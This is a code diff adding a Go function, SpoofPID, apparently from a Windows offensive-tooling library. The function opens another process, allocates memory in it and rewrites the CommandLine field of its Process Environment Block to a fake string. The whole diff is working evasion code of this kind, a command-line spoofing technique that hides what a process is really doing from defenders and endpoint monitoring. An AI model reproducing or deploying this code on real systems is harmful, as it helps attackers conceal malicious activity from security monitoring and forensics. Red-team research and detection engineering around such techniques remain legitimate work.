@@ -166,3 +166,137 @@ func getCmdLinePtr(caller *wsyscall.Caller) (*unicodeString, error) {
 
 	return (*unicodeString)(unsafe.Pointer(ppAddr + 0x70)), nil
 }
+
+// SpoofPID overwrites the PEB CommandLine UNICODE_STRING of process pid.
+// Requires PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
+// PROCESS_QUERY_INFORMATION on the target. There is no corresponding Restore —
+// call SpoofPID again with the original string if needed; the caller is
+// responsible for tracking the original value.
+//
+// caller may be nil (falls back to ntdll via api.ProcNtQueryInformationProcess).
+func SpoofPID(pid uint32, fakeCmd string, caller *wsyscall.Caller) error {
+	const access = windows.PROCESS_VM_READ | windows.PROCESS_VM_WRITE |
+		windows.PROCESS_VM_OPERATION | windows.PROCESS_QUERY_INFORMATION
+
+	handle, err := windows.OpenProcess(access, false, pid)
+	if err != nil {
+		return fmt.Errorf("fakecmd: OpenProcess(%d): %w", pid, err)
+	}
+	defer windows.CloseHandle(handle)
+
+	pbi, err := remoteProcessBasicInfo(handle, caller)
+	if err != nil {
+		return err
+	}
+
+	var ppAddr uintptr
+	if err := readRemotePtr(handle, pbi.PebBaseAddress+0x20, &ppAddr); err != nil {
+		return fmt.Errorf("fakecmd: read ProcessParameters ptr: %w", err)
+	}
+
+	fakeUTF16, err := windows.UTF16FromString(fakeCmd)
+	if err != nil {
+		return fmt.Errorf("fakecmd: UTF16FromString: %w", err)
+	}
+	byteLen := uintptr(len(fakeUTF16) * 2)
+
+	var remoteAddr uintptr
+	size := byteLen
+	var allocStatus uintptr
+	if caller != nil {
+		allocStatus, _ = caller.Call("NtAllocateVirtualMemory",
+			uintptr(handle),
+			uintptr(unsafe.Pointer(&remoteAddr)),
+			0,
+			uintptr(unsafe.Pointer(&size)),
+			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
+			uintptr(windows.PAGE_READWRITE),
+		)
+	} else {
+		ntAlloc := api.Ntdll.NewProc("NtAllocateVirtualMemory")
+		allocStatus, _, _ = ntAlloc.Call(
+			uintptr(handle),
+			uintptr(unsafe.Pointer(&remoteAddr)),
+			0,
+			uintptr(unsafe.Pointer(&size)),
+			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
+			uintptr(windows.PAGE_READWRITE),
+		)
+	}
+	if allocStatus != 0 {
+		return fmt.Errorf("fakecmd: NtAllocateVirtualMemory in target: NTSTATUS 0x%X", uint32(allocStatus))
+	}
+
+	fakeBytes := unsafe.Slice((*byte)(unsafe.Pointer(&fakeUTF16[0])), byteLen)
+	if err := windows.WriteProcessMemory(handle, remoteAddr,
+		&fakeBytes[0], byteLen, nil); err != nil {
+		return fmt.Errorf("fakecmd: WriteProcessMemory (string): %w", err)
+	}
+
+	newLen := uint16((len(fakeUTF16) - 1) * 2)
+	newMaxLen := uint16(len(fakeUTF16) * 2)
+	cmdLineAddr := ppAddr + 0x70
+
+	writeU16 := func(off uintptr, v uint16) error {
+		return windows.WriteProcessMemory(handle, cmdLineAddr+off,
+			(*byte)(unsafe.Pointer(&v)), 2, nil)
+	}
+	if err := writeU16(0, newLen); err != nil {
+		return fmt.Errorf("fakecmd: patch Length: %w", err)
+	}
+	if err := writeU16(2, newMaxLen); err != nil {
+		return fmt.Errorf("fakecmd: patch MaximumLength: %w", err)
+	}
+	if err := windows.WriteProcessMemory(handle, cmdLineAddr+8,
+		(*byte)(unsafe.Pointer(&remoteAddr)), unsafe.Sizeof(remoteAddr), nil); err != nil {
+		return fmt.Errorf("fakecmd: patch Buffer: %w", err)
+	}
+
+	return nil
+}
+
+// remoteProcessBasicInfo fetches PROCESS_BASIC_INFORMATION for the given handle.
+func remoteProcessBasicInfo(handle windows.Handle, caller *wsyscall.Caller) (processBasicInformation, error) {
+	var pbi processBasicInformation
+	size := uint32(unsafe.Sizeof(pbi))
+	var returnLen uint32
+	const processBasicInformationClass = 0
+
+	var status uintptr
+	if caller != nil {
+		var callErr error
+		status, callErr = caller.Call("NtQueryInformationProcess",
+			uintptr(handle),
+			uintptr(processBasicInformationClass),
+			uintptr(unsafe.Pointer(&pbi)),
+			uintptr(size),
+			uintptr(unsafe.Pointer(&returnLen)),
+		)
+		if status != 0 {
+			return pbi, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X: %w", uint32(status), callErr)
+		}
+	} else {
+		r, _, _ := api.ProcNtQueryInformationProcess.Call(
+			uintptr(handle),
+			uintptr(processBasicInformationClass),
+			uintptr(unsafe.Pointer(&pbi)),
+			uintptr(size),
+			uintptr(unsafe.Pointer(&returnLen)),
+		)
+		if r != 0 {
+			return pbi, fmt.Errorf("NtQueryInformationProcess: NTSTATUS 0x%X", uint32(r))
+		}
+	}
+	return pbi, nil
+}
+
+// readRemotePtr reads a uintptr-sized value from addr in the remote process.
+func readRemotePtr(proc windows.Handle, addr uintptr, out *uintptr) error {
+	return windows.ReadProcessMemory(proc, addr,
+		(*byte)(unsafe.Pointer(out)), unsafe.Sizeof(*out), nil)
+}
+
+// readRemoteStruct reads size bytes from addr in the remote process into dst.
+func readRemoteStruct(proc windows.Handle, addr uintptr, dst unsafe.Pointer, size uintptr) error {
+	return windows.ReadProcessMemory(proc, addr, (*byte)(dst), size, nil)
+}
